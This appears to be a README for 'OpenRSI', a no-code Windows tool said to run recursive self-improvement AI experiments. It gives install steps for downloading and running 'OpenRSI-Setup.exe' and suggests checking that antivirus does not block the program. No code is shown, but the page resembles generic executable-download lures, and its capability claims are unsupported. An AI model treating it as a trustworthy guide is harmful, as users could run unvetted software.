📦 What is OpenRSI?

OpenRSI provides a simple platform for users to run and test recursive self-improvement AI systems. It connects your computer to the OpenMLE and Frontis-MA1 frameworks. You can use these tools to create models that improve their own performance through repeated cycles of trial and error.

We designed this software for people who want to understand machine intelligence. You do not need to write code to get started. OpenRSI handles the heavy lifting, letting you focus on the results of your experiments.

⚙️ System Requirements

Before you install OpenRSI, check that your computer meets these minimum requirements:

  • Operating System: Windows 10 or Windows 11
  • Processor: 64-bit multi-core processor (Intel Core i5 or AMD Ryzen 5 recommended)
  • Memory: 8 GB of RAM (16 GB recommended)
  • Storage: 2 GB of free disk space
  • Graphics: Dedicated GPU with at least 4 GB of VRAM helps speed up the self-improvement cycles

📥 Download and Installation

Follow these steps to install the software on your machine:

  1. Visit the official releases page.
  2. Find the section labeled "Assets" under the most recent version.
  3. Click the file named "OpenRSI-Setup.exe" to start the download.
  4. Locate the file in your "Downloads" folder once the process finishes.
  5. Double-click the file to launch the installer.
  6. Follow the instructions on your screen.
  7. Select the option to create a desktop shortcut for easier access.
  8. Click "Finish" to complete the installation.

🛠️ Running Your First Experiment

Once you install the program, find the OpenRSI icon on your desktop. Double-click it to start the application. The main dashboard appears on your screen.

The dashboard displays your current model version. To begin, select "New Project" from the top menu. The program prompts you to choose a base model from the Frontis-MA1 library. Pick a model and click "Load."

After the model loads, click the "Run Cycle" button. The software begins the recursive process. It will show you a progress bar. You can view the improvement metrics in the output window below the progress bar.

🔍 Frequently Asked Questions

Does OpenRSI use my internet connection?

The program uses your internet connection only to check for updates and to sync with public AI model libraries. You can run most of the improvement cycles offline once the models load.

How do I save my progress?

OpenRSI saves your work automatically every time a cycle ends. You can find your saved files in the "Documents/OpenRSI/Projects" folder on your computer.

What should I do if the software crashes?

If the software stops responding, restart the application. If issues persist, check your antivirus settings to ensure it does not block the software's access to your local folders.

📝 Troubleshooting

Most issues arise from missing Windows updates. Ensure your version of Windows remains up to date. Also, make sure you install the latest graphics drivers from your manufacturer website. This often solves performance problems during the self-improvement phase.
